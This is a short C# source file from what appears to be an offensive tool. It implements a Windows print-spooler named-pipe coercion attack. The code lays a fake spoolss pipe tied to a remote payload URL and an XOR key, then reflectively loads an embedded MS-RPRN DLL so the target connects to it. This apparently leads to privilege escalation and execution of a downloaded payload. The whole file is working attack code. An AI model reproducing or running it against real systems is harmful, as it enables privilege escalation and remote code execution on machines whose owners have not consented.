using RDI;
using PipeLayer;
using System;
using System.Text;
using System.Threading;

namespace StoolSample
{
    public class StoolSample
    {
        // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
        public static void SpoolUp(string target, string pipeName, string payloadUrl, string xorKey)
        {
            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{target} \\\\{target}/pipe/{pipeName}");
            bool ready = false;

            Thread layThePipe = new Thread(() =>
            {
                PipeLayer.PipeLayer.LayPipe($"\\\\.\\pipe\\{pipeName}\\pipe\\spoolss", payloadUrl, xorKey);
            });
            layThePipe.IsBackground = false;
            layThePipe.Start();


            Thread.Sleep(2000);
            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
            
            layThePipe.Join();
        }
    }
}
